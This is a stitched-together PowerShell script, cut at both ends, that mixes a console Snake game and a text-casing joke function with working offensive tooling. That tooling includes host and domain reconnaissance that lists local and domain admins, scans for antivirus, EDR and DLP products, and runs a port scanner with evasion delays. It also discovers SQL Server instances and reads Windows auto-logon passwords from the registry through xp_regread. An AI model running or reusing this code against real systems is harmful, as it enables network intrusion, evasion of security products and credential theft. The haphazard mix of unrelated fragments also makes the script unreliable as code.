    write-host $("{0}*************************" -f (' ' * ($Rows +10) ))  -ForegroundColor White
    write-host $("{0}*************************" -f (' ' * ($Rows +10) ))  -ForegroundColor White
    $host.ui.RawUI.CursorPosition = $oldpos
    sleep .05
function Spongebob ([string]$String,[switch]$Reverse,[switch]$Random,[switch]$Both)
{
    $Result = @()
    foreach ($Char in ($String.ToCharArray()))
    {
        switch (($Special = ($Char -match "[\W\s]")),($Count = ((Get-Random (0,1)) % 2 -eq 0)))
        {
            {($Special-eq $FALSE) -and ($Count -eq $TRUE)} {$Result += $Char.ToString().ToUpper(); BREAK}
            {($Special-eq $FALSE) -and ($Count -eq $FALSE)} {$Result += $Char.ToString().ToLower(); BREAK} 
            {($Special-eq $TRUE)} {$Result += $Char; BREAK}
        }
    }
    if ($Reverse -or $Both)
    {
        [array]::Reverse($Result)
    }
    if ($Random -or $Both)
    {
        $Result = (($Result -join "") -split " " | Sort-Object {Get-Random}) -join " "
    }
    Set-Clipboard ($Result -join "")
}
function Get-KeySilent {
    if([console]::KeyAvailable){
            while([console]::KeyAvailable){
                  $key = [console]::readkey("noecho").Key}}
    else{$key = "#"}
    return $key

}
function WriteTo-Pos ([string] $str, [int] $x = 0, [int] $y = 0,
      [string] $bgc = [console]::BackgroundColor,
      [string] $fgc = [Console]::ForegroundColor)
{
      if($x -ge 0 -and $y -ge 0 -and $x -le [Console]::WindowWidth -and
            $y -le [Console]::WindowHeight)
      {
            $saveY = [console]::CursorTop
            $offY = [console]::WindowTop       
            [console]::setcursorposition($x,$offY+$y)
            Write-Host -Object $str -BackgroundColor $bgc -ForegroundColor $fgc -NoNewline
            [console]::setcursorposition(0,$saveY)
      }
}
function ReadFrom-Pos ($x, $y) {
      if($x -ge 0 -and $y -ge 0 -and $x -le [Console]::WindowWidth -and
            $y -le [Console]::WindowHeight) {
      $y += [console]::WindowTop
      $r = New-Object System.Management.Automation.Host.Rectangle $x,$y,$x,$y
      $host.UI.RawUI.GetBufferContents($r)[0,0]
      }
}
function Snake {
    cls
for ($i=1; $i -le 79; $i++) {
        WriteTo-Pos "¤" $i 1 white white
WriteTo-Pos "¤" $i 22 white white
        if ($i -le 22) {
WriteTo-Pos "¤" 1 $i white white
WriteTo-Pos "¤" 79 $i white white 
}
WriteTo-Pos "Score " 1 24  
    } 
# Set the start position
    $x = 5
    $y = 15
# Collision set to 0
$col =0
# Start length 15
$l = 15
# Start sleep time 100
$s = 100
# Start direction is set to left
$dx = 1
# Create X and Y array (Used for the tail)
$ax = @()
$ay = @()
    # While no collision is detected
while ($col -eq 0)  {
# Get key press
$ck = Get-KeySilent
# $dx is the X direction, -1 for left or 1 for right and the same goes for Y direction
if ($ck -like "uparrow")  { 
$dx = 0 
$dy = -1
}
if ($ck -like "downarrow")  { 
$dx = 0 
$dy = 1
}
if ($ck -like "leftarrow")  { 
$dx = -1 
$dy = 0
}
if ($ck -like "rightarrow")  { 
$dx = 1 
$dy = 0
}
        # Add the current X and Y to the tail arrays
$ax +=  $x
$ay +=  $y
# add the directional variable to the current position
$x=$x+$dx
$y=$y+$dy
# Add 1 to the counter
$c++
# Add 1 to the score
$score++
# Detect collection
if (([int][char](ReadFrom-Pos $x $y).Character) -eq 164) { 
$col++
} else {
# Detect collision with a plus, add 20 to length
if (([int][char](ReadFrom-Pos $x $y).Character) -eq 43) { 
$l = $l + 20
$score = $score + 1000
}
# Write head of the Snake
WriteTo-Pos "@" $x $y
# Write the tail using the tail array
WriteTo-Pos "¤" $ax[$c-1] $ay[$c-1]
# Update the score
WriteTo-Pos $score 7 24
# Divide the counter with 100 and if the result is a whole number add a plus at a random position
$mod = $c % 100
if ($mod -eq 0) {
$rx = get-random -minimum 2 -maximum 78
$ry = get-random -minimum 2 -maximum 21
WriteTo-Pos "+" $rx $ry blue red
$s=$s-5
}
# Delete the tail when it is longer than the current length
if ($c -gt $l -and $c -gt 4) {
WriteTo-Pos " " $ax[$c-$l-1] $ay[$c-$l-1]
}
}
# Add a little sleep to the Snake
if ($s -gt 0) {sleep -Milliseconds $s}
}
# You done went and died!
$go =  "Game over! Score: " + $score 
# I made a simple PHP Get page that inserts the score in a MySQL db, I've removed it here.
$Uname = [Environment]::UserName
$cname = [Environment]::MachineName
#$x = Invoke-WebRequest -URI "https://urldefense.com/v3/__http://ZXZXZXZXZXZX.ZXZ/ins.php?Uname=$($Uname)&Cname=$($Cname)&Score=$($Score)__;!!KLCbKzk!iSueaBqZc78sqRK0RAOIcm_h0_-a5EuBuxa99kPqQB8wOtPMTM5OPYO0AYUAsSCVPbdHdQt8Utg2_Xo$  "
WriteTo-Pos $go 1 24
}
gip
$letters = [Char[]]'abcdefghijklmnopqrstuvwxyz'
  $letters += [Char]0x00EB,[Char]0x00E4,[Char]0x00E9
  -join ( Get-Random 26)
$TotalSteps = 4
$Step = 1
$StepText = "Setting Initial Variables"
$StatusText = '"Step $($Step.ToString().PadLeft($TotalSteps.Count.ToString().Length)) of $TotalSteps | $StepText"'
$StatusBlock = [ScriptBlock]::Create($StatusText)
$Task = "Creating Progress Bar Script Block for Groups"
function Invoke-HostRecon{
    Param(
        [Parameter(Position = 0, Mandatory = $false)]
        [switch]
        $Portscan,
        [Parameter(Position = 1, Mandatory = $false)]
        [string]
        $TopPorts = "50",
        [Parameter(Position = 2, Mandatory = $false)]
        [switch]
        $DisableDomainChecks = $false,
        [ValidateRange(1,65535)][String[]]$Portlist = ""
    )
    Write-Output "[*] Hostname"
    $Computer = $env:COMPUTERNAME
    $Computer
    Write-Output "`n"
    Write-Output "[*] IP Address Info"
    $ipinfo = Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter 'IPEnabled = True'| Select-Object IPAddress,Description | Format-Table -Wrap | Out-String
    $ipinfo
    Write-Output "`n"
    Write-Output "[*] Current Domain and Username"
    $currentuser = $env:USERNAME
    Write-Output "Domain = $env:USERDOMAIN"
    Write-Output "Current User = $env:USERNAME"
    Write-Output "`n"
    Write-Output "[*] Local Users of this system"
    $locals = Get-WmiObject -Class Win32_UserAccount -Filter  "LocalAccount='True'" | Select-Object Name 
    $locals
    Write-Output "`n"
    Write-Output "[*] Local Admins of this system"
  #  $Admins = Get-WmiObject win32_groupuser | Where-Object { $_.GroupComponent -match 'administrators' -and ($_.GroupComponent -match "Domain=`"$env:COMPUTERNAME`"")} | ForEach-Object {[wmi]$_.PartComponent } | Select-Object Caption,SID | format-table -Wrap | Out-String
    $Admins
	<#
	comment block
	more comments
	blah blah blah
	#>
    Write-Output "`n"
        Write-Output "[*] Active Network Connections"
        $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
        $Connections = $TCPProperties.GetActiveTcpConnections()            
        $objarray = @()
        foreach($Connection in $Connections) {            
            if($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }            
            $OutputObj = New-Object -TypeName PSobject            
            $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $Connection.LocalEndPoint.Address            
            $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalPort" -Value $Connection.LocalEndPoint.Port            
            $OutputObj | Add-Member -MemberType NoteProperty -Name "RemoteAddress" -Value $Connection.RemoteEndPoint.Address            
            $OutputObj | Add-Member -MemberType NoteProperty -Name "RemotePort" -Value $Connection.RemoteEndPoint.Port            
            $OutputObj | Add-Member -MemberType NoteProperty -Name "State" -Value $Connection.State            
            $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
            $objarray += $OutputObj
            }
            $activeconnections = $objarray | Format-Table -Wrap | Out-String
            $activeconnections
       Write-Output "[*] Active TCP Listeners"            
        $ListenConnections = $TCPProperties.GetActiveTcpListeners()            
        $objarraylisten = @()
            foreach($Connection in $ListenConnections) {            
            if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
            $OutputObjListen = New-Object -TypeName PSobject            
            $OutputObjListen | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address            
            $OutputObjListen | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
            $OutputObjListen | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
            $objarraylisten += $OutputObjListen }
            $listeners = $objarraylisten | Format-Table -Wrap | Out-String
            $listeners   
    Write-Output "`n"
    Write-Output "[*] DNS Cache"
    try{
    $dnscache = Get-WmiObject -query "Select * from MSFT_DNSClientCache" -Namespace "root\standardcimv2" -ErrorAction stop | Select-Object Entry,Name,Data | Format-Table -Wrap | Out-String
    $dnscache
    }
	#toss one in here
    catch
        {
        Write-Output "There was an error retrieving the DNS cache."
        }
    Write-Output "`n"
    Write-Output "[*] Share listing"
    $shares = @()
    $shares = Get-WmiObject -Class Win32_Share | Format-Table -Wrap | Out-String
    $shares
    Write-Output "`n"
    Write-Output "[*] List of scheduled tasks"
    $schedule = new-object -com("Schedule.Service")
    $schedule.connect() 
    $tasks = $schedule.getfolder("\").gettasks(0) | Select-Object Name | Format-Table -Wrap | Out-String
    If ($tasks.count -eq 0)
        {
        Write-Output "[*] Task scheduler appears to be empty"
        }
    If ($tasks.count -ne 0)
        {
        $tasks
        }
    Write-Output "`n"
    Write-Output "[*] Proxy Info"
    $proxyenabled = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyEnable
    $proxyserver = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').proxyServer
    If ($proxyenabled -eq 1)
        {
            Write-Output "A system proxy appears to be enabled."
            Write-Output "System proxy located at: $proxyserver"
        }
    Elseif($proxyenabled -eq 0)
        {
            Write-Output "There does not appear to be a system proxy enabled."
        }
    Write-Output "`n"
    Write-Output "[*] Checking if AV is installed"
    $AV = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntiVirusProduct" 
    If ($AV -ne "")
        {
            Write-Output "The following AntiVirus product appears to be installed:" $AV.displayName
        }
    If ($AV -eq "")
        {
            Write-Output "No AV detected."
        }
    Write-Output "`n"
    Write-Output "[*] Checking local firewall status."
    $HKLM = 2147483650
    $reg = get-wmiobject -list -namespace root\default -computer $computer | where-object { $_.name -eq "StdRegProv" }
    $firewallEnabled = $reg.GetDwordValue($HKLM, "System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile","EnableFirewall")
    $fwenabled = [bool]($firewallEnabled.uValue)
    If($fwenabled -eq $true)
        {
            Write-Output "The local firewall appears to be enabled."
        }
    If($fwenabled -ne $true)
        {
            Write-Output "The local firewall appears to be disabled."
        }
    Write-Output "`n"

    #Checking for Local Admin Password Solution (LAPS)

    Write-Output "[*] Checking for Local Admin Password Solution (LAPS)"
    try
        {
        $lapsfile = Get-ChildItem "$env:ProgramFiles\LAPS\CSE\Admpwd.dll" -ErrorAction Stop
        if ($lapsfile)
            {
            Write-Output "The LAPS DLL (Admpwd.dll) was found. Local Admin password randomization may be in use."
            }
        }
    catch
        {
        Write-Output "The LAPS DLL was not found."
        }
    Write-Output "`n"
    Write-Output "[*] Running Processes"
    $processes = Get-Process | Select-Object ProcessName,Id,Description,Path 
    $processout = $processes | Format-Table -Wrap | Out-String
    $processout
    Write-Output "`n"
    Write-Output "[*] Checking for Sysinternals Sysmon"
    try
        {
        $sysmondrv = Get-ChildItem "$env:SystemRoot\sysmondrv.sys" -ErrorAction Stop
        if ($sysmondrv)
            {
            Write-Output "The Sysmon driver $($sysmondrv.VersionInfo.FileVersion) (sysmondrv.sys) was found. System activity may be monitored."
            }
        }
    catch
        {
        Write-Output "The Sysmon driver was not found."
        }
    Write-Output "`n"
    Write-Output "[*] Checking for common security product processes"
    $processnames = $processes | Select-Object ProcessName
    Foreach ($ps in $processnames)
            {
            if ($ps.ProcessName -like "*mcshield*")
                {
                Write-Output ("Possible McAfee AV process " + $ps.ProcessName + " is running.")
                }
            if (($ps.ProcessName -like "*windefend*") -or ($ps.ProcessName -like "*MSASCui*") -or ($ps.ProcessName -like "*msmpeng*") -or ($ps.ProcessName -like "*msmpsvc*"))
                {
                Write-Output ("Possible Windows Defender AV process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "*WRSA*")
                {
                Write-Output ("Possible WebRoot AV process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "*savservice*")
                {
                Write-Output ("Possible Sophos AV process " + $ps.ProcessName + " is running.")
                }
            if (($ps.ProcessName -like "*TMCCSF*") -or ($ps.ProcessName -like "*TmListen*") -or ($ps.ProcessName -like "*NTRtScan*"))
                {
                Write-Output ("Possible Trend Micro AV process " + $ps.ProcessName + " is running.")
                }
            if (($ps.ProcessName -like "*symantec antivirus*") -or ($ps.ProcessName -like "*SymCorpUI*") -or ($ps.ProcessName -like "*ccSvcHst*") -or ($ps.ProcessName -like "*SMC*")  -or ($ps.ProcessName -like "*Rtvscan*"))
                {
                Write-Output ("Possible Symantec AV process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "*mbae*")
                {
                Write-Output ("Possible MalwareBytes Anti-Exploit process " + $ps.ProcessName + " is running.")
                }
            #if ($ps.ProcessName -like "*mbam*")
               # {
               # Write-Output ("Possible MalwareBytes Anti-Malware process " + $ps.ProcessName + " is running.")
               # }
            #AppWhitelisting
            if ($ps.ProcessName -like "*Parity*")
                {
                Write-Output ("Possible Bit9 application whitelisting process " + $ps.ProcessName + " is running.")
                }
            #Behavioral Analysis
            if ($ps.ProcessName -like "*cb*")
                {
                Write-Output ("Possible Carbon Black behavioral analysis process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "*bds-vision*")
                {
                Write-Output ("Possible BDS Vision behavioral analysis process " + $ps.ProcessName + " is running.")
                } 
            if ($ps.ProcessName -like "*Triumfant*")
                {
                Write-Output ("Possible Triumfant behavioral analysis process " + $ps.ProcessName + " is running.")
                }
            if ($ps.ProcessName -like "CSFalcon")
                {
                Write-Output ("Possible CrowdStrike Falcon EDR process " + $ps.ProcessName + " is running.")
                }
            #Intrusion Detection
            if ($ps.ProcessName -like "*ossec*")
                {
                Write-Output ("Possible OSSEC intrusion detection process " + $ps.ProcessName + " is running.")
                } 
            #Firewall
            if ($ps.ProcessName -like "*TmPfw*")
                {
                Write-Output ("Possible Trend Micro firewall process " + $ps.ProcessName + " is running.")
                } 
            #DLP
            if (($ps.ProcessName -like "dgagent") -or ($ps.ProcessName -like "DgService") -or ($ps.ProcessName -like "DgScan"))
                {
                Write-Output ("Possible Verdasys Digital Guardian DLP process " + $ps.ProcessName + " is running.")
                }   
            if ($ps.ProcessName -like "kvoop")
                {
                Write-Output ("Possible Unknown DLP process " + $ps.ProcessName + " is running.")
                }                       
            }
    Write-Output "`n"
    if ($DisableDomainChecks -eq $false)
    {
    #Domain Password Policy
    $domain = "$env:USERDOMAIN"
    Write-Output "[*] Domain Password Policy"
            Try 
            {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$domain)
                $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                $CurrentDomain = [ADSI]"WinNT://$env:USERDOMAIN"
                $Name = @{Name="DomainName";Expression={$_.Name}}
	            $MinPassLen = @{Name="Minimum Password Length";Expression={$_.MinPasswordLength}}
                $MinPassAge = @{Name="Minimum Password Age (Days)";Expression={$_.MinPasswordAge.value/86400}}
	            $MaxPassAge = @{Name="Maximum Password Age (Days)";Expression={$_.MaxPasswordAge.value/86400}}
	            $PassHistory = @{Name="Enforce Password History (Passwords remembered)";Expression={$_.PasswordHistoryLength}}
	            $AcctLockoutThreshold = @{Name="Account Lockout Threshold";Expression={$_.MaxBadPasswordsAllowed}}
	            $AcctLockoutDuration =  @{Name="Account Lockout Duration (Minutes)";Expression={if ($_.AutoUnlockInterval.value -eq -1) {'Account is locked out until administrator unlocks it.'} else {$_.AutoUnlockInterval.value/60}}}
	            $ResetAcctLockoutCounter = @{Name="Observation Window";Expression={$_.LockoutObservationInterval.value/60}}
	            $CurrentDomain | Select-Object $Name,$MinPassLen,$MinPassAge,$MaxPassAge,$PassHistory,$AcctLockoutThreshold,$AcctLockoutDuration,$ResetAcctLockoutCounter | format-list | Out-String
            }
            catch 
            {
                Write-Output "Error connecting to the domain while retrieving password policy."    
            }
    Write-Output "`n"
    #Domain Controllers
    Write-Output "[*] Domain Controllers"
            Try 
            {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$domain)
                $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                $DCS = $DomainObject.DomainControllers
                foreach ($dc in $DCS)
                {
                    $dc.Name
                }
            }
            catch 
            {
                Write-Output "Error connecting to the domain while retrieving listing of Domain Controllers."    
            }
       Write-Output "`n"
    Write-Output "[*] Domain Admins"
            Try 
            {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$domain)
                $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            
                $DAgroup = ([adsi]"WinNT://$domain/Domain Admins,group")
                $Members = @($DAgroup.psbase.invoke("Members"))
                [Array]$MemberNames = $Members | ForEach{([ADSI]$_).InvokeGet("Name")}
                $MemberNames
            }
            catch 
            {
                Write-Output "Error connecting to the domain while retrieving Domain Admins group members."    

            }
       Write-Output "`n"
    }
    If($Portscan)
    {
    if ($Portlist -ne "")
    {
    TCP-PortScan -Portlist $Portlist
    }
    else
    {
    TCP-PortScan -TopPorts $TopPorts
    }
    }
}
function TCP-PortScan {
    param(  [String]$Hostname = 'allports.exposed',
            [ValidateRange(1,65535)][Int]$MinPort = 1,
            [ValidateRange(1,65535)][Int]$MaxPort = 1,
            [ValidateRange(1,128)][Int]$TopPorts = 50,
            [ValidateRange(10,10000)][Int]$Timeout = 400,
            [ValidateRange(1,65535)][String[]]$Portlist = "",
            [switch]$NoRandomDelay = $false )
    $resolved = [System.Net.Dns]::GetHostByName($Hostname)
    $ip = $resolved.AddressList[0].IPAddressToString
    $tcp_top128 =  80, 443
    $report = @()
    if ($MaxPort -gt 1 -and $MinPort -lt $MaxPort) {
        $ports = $MinPort..$MaxPort
        Write-Host -NoNewline "[*] Scanning $Hostname ($ip), port range $MinPort -> $MaxPort : "
    }
    elseif ($MaxPort -lt $MinPort) {
        Throw "Are you out of your mind?  Port range cannot go negative."
    }
    elseif($Portlist -ne ""){
    $ports = $Portlist
    Write-Host -NoNewline "[*] Scanning $Hostname ($ip), using the portlist provided."
    }
    else {
        $PortDiff = $TopPorts - 1
        $ports = $tcp_top128[0..$PortDiff]
        Write-Host -NoNewline "[*] Scanning $Hostname ($ip), just two ports so NCDC should not wig : "
    }  
    $total = 0
    $tcp_count = 0
    foreach ($port in Get-Random -input $ports -count $ports.Count) {
        if (![Math]::Floor($total % ($ports.Count / 10))) {
            Write-Host -NoNewline "."
        }
        $total += 1
        $temp = "" | Select Address, Port, Proto, Status, Banner
        $temp.Proto = "tcp"
        $temp.Port = $port
        $temp.Address = $ip
        $tcp = new-Object system.Net.Sockets.TcpClient
        $connect = $tcp.BeginConnect($ip,$port,$null,$null)
        $wait = $connect.AsyncWaitHandle.WaitOne($Timeout,$false)
        if (!$wait) {
            $error.clear()
            $tcp.close()
            $temp.Status = "closed"
        }
        else {
            try {
                $tcp.EndConnect($connect)
                $tcp.Close()
                $temp.Status = "open"
                $tcp_count += 1
            }
            catch {
                $temp.Status = "reset"
            }
        }
        $report += $temp
        if (!$NoRandomDelay) {
            $sleeptime = Get-Random -Minimum 10 -Maximum 50
            Start-Sleep -Milliseconds $sleeptime
        }
    }
    Write-Host
    $columns = @{l='IP-Address';e={$_.Address}; w=15; a="left"},@{l='Proto';e={$_.Proto};w=5;a="right"},@{l='Port';e={$_.Port}; w=5; a="right"},@{l='Status';e={$_.Status}; w=4; a="right"}
    $report | where {$_.Status -eq "open"} | Sort-Object Port | Format-Table $columns -AutoSize
    Write-Output "[*] $tcp_count out of $total scanned ports are open!"
}
Invoke-HostRecon
tcp-portscan
# -------------------------------------------
# Function:  Get-SQLInstanceBroadcast
# -------------------------------------------
# Author: Scott Sutherland
# Initial publication by @nikhil_mitt on twitter
function Get-SQLInstanceBroadcast 
{
    <#
            .SYNOPSIS
            This function sends a UDP request to the broadcast address of the current subnet using the 
            SMB protocol over port 138 to identify SQL Server instances on the local network.  The .net function used
            has been supported since .net version 2.0. For more information see the reference below:
            https://urldefense.com/v3/__https://msdn.microsoft.com/en-us/library/system.data.sql.sqldatasourceenumerator(v=vs.110).aspx__;!!KLCbKzk!iSueaBqZc78sqRK0RAOIcm_h0_-a5EuBuxa99kPqQB8wOtPMTM5OPYO0AYUAsSCVPbdHdQt8nK0gRE8$  
            .EXAMPLE
            PS C:\> Get-SQLInstanceBroadcast -Verbose
            VERBOSE: Attempting to identify SQL Server instances on the broadcast domain.
            VERBOSE: 7 SQL Server instances were found.

            ComputerName                         Instance                            IsClustered                         Version                            
            ------------                         --------                            -----------                         -------                            
            MSSQLSRV01                           MSSQLSRV01\SQLSERVER2012            No                                  11.0.2100.60
            MSSQL2K5                             MSSQL2K5                            No                                  9.00.1399.06
            MSSQLSRV03                           MSSQLSRV03\SQLSERVER2008            No                                  10.0.1600.22
            MSSQLSRV04                           MSSQLSRV04\SQLSERVER2014            No                                  12.0.4100.1
            MSSQLSRV04                           MSSQLSRV04\SQLSERVER2016            No                                  13.0.1601.5
            MSSQLSRV04                           MSSQLSRV04\BOSCHSQL                 No                                  12.0.4100.1
            MSSQLSRV04                           MSSQLSRV04\SQLSERVER2017            No                                  14.0.500.272
    #>

    [CmdletBinding()]
    Param(
            [Parameter(Mandatory = $false,
        HelpMessage = 'This will send a UDP request to each of the identified SQL Server instances to gather more information..')]
        [switch]$UDPPing
    )

    Begin
    {
        # Create data table for output
        $TblSQLServers = New-Object -TypeName System.Data.DataTable
        $null = $TblSQLServers.Columns.Add('ComputerName')
        $null = $TblSQLServers.Columns.Add('Instance')
        $null = $TblSQLServers.Columns.Add('IsClustered')
        $null = $TblSQLServers.Columns.Add('Version')        

        write-output "Attempting to identify SQL Server instances on the broadcast domain."
    }

    Process
    {
        try {

            # Discover instances
            $Instances = [System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()

            # Add results to modified data table
            $Instances | 
            ForEach-Object {
                [string]$InstanceTemp =  $_.InstanceName
                if($InstanceTemp){
                    [string]$InstanceName = $_.Servername + "\" + $_.InstanceName
                }else{
                    [string]$InstanceName = $_.Servername 
                }
                [string]$ComputerName = $_.Servername
                [string]$IsClustered  = $_.IsClustered
                [string]$Version      = $_.Version

                # Add to table
                $TblSQLServers.Rows.Add($ComputerName, $InstanceName, $IsClustered, $Version) | Out-Null
            }
        }
        catch{

            # Show error message
            $ErrorMessage = $_.Exception.Message
            Write-Host -Message " Operation Failed."
            Write-Host -Message " Error: $ErrorMessage"     
        }
    }

    End
    {               
        # Get instance count
        $InstanceCount = $TblSQLServers.Rows.Count
        write-output "$InstanceCount SQL Server instances were found."
        
        # Get port and force engcryption flag
        if($UDPPing){
            write-output "Performing UDP ping against $InstanceCount SQL Server instances."
            $TblSQLServers |
            ForEach-Object{
                $CurrentComputer = $_.ComuterName                
                Get-SQLInstanceScanUDP -ComputerName $_.ComputerName -SuppressVerbose
            }
        }         

        # Return results
        if(-not $UDPPing){
            $TblSQLServers
        }
    }
}
get-sqlinstancebroadcast
write-host -message " Doing very well, making progress."
Function Get-ComputerNameFromInstance
{
    <#
            .SYNOPSIS
            Parses computer name from a provided instance.
            .PARAMETER Instance
            SQL Server instance to parse.
            .EXAMPLE
            PS C:\> Get-ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
            SQLServer1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance
    )

    # Parse ComputerName from provided instance
    If ($Instance)
    {
        $ComputerName = $Instance.split('\')[0].split(',')[0]
    }
    else
    {
        $ComputerName = $env:COMPUTERNAME
    }

    Return $ComputerName
}
get-module -listavailable
Function   Get-SQLRecoverPwAutoLogon
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblWinAutoCreds = New-Object -TypeName System.Data.DataTable
        $TblWinAutoCreds.Columns.Add("ComputerName") | Out-Null
        $TblWinAutoCreds.Columns.Add("Instance") | Out-Null
        $TblWinAutoCreds.Columns.Add("Domain") | Out-Null
        $TblWinAutoCreds.Columns.Add("UserName") | Out-Null
        $TblWinAutoCreds.Columns.Add("Password") | Out-Null
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                write-output -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                write-output -Message "$Instance : Connection Failed."
            }
            return
        }       

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        # Get SQL Server version number
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        # Check if this can actually run with the current login
        if($IsSysadmin -ne "Yes")
        {          
            write-output "$Instance : This function requires sysadmin privileges. Done."
            Return
        }

        # Get default auto login Query
        $DefaultQuery = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get AutoLogin Default Domain
        DECLARE @AutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultDomainName',
        @value			= @AutoLoginDomain output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultUserName',
        @value			= @AutoLoginUser output

        -- Get AutoLogin DefaultUsername
        DECLARE @AutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'DefaultPassword',
        @value			= @AutoLoginPassword output

        -- Display Results
        SELECT Domain = @AutoLoginDomain, Username = @AutoLoginUser, Password = @AutoLoginPassword"

        # Execute Default Query
        $DefaultResults = Get-SQLQuery -Instance $Instance -Query $DefaultQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose     
        $DefaultUsername = $DefaultResults.Username
        if($DefaultUsername.length -ge 2){

            # Add record to data table
            $DefaultResults | ForEach-Object{                
                $TblWinAutoCreds.Rows.Add($ComputerName, $Instance,$_.Domain,$_.Username,$_.Password) | Out-Null
            }                    
        }else{
            write-output "$Instance : No default auto login credentials found."
        }

        # Get default alt auto login Query
        $AltQuery = "
        -------------------------------------------------------------------------
        -- Get Alternative Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------

        -- Get Alt AutoLogin Default Domain
        DECLARE @AltAutoLoginDomain  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultDomainName',
        @value			= @AltAutoLoginDomain output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginUser  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultUserName',
        @value			= @AltAutoLoginUser output

        -- Get Alt AutoLogin DefaultUsername
        DECLARE @AltAutoLoginPassword  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
        @value_name		= N'AltDefaultPassword',
        @value			= @AltAutoLoginPassword output

        -- Display Results
        SELECT Domain = @AltAutoLoginDomain, Username = @AltAutoLoginUser, Password = @AltAutoLoginPassword"

        # Execute Default Query
        $AltResults = Get-SQLQuery -Instance $Instance -Query $AltQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
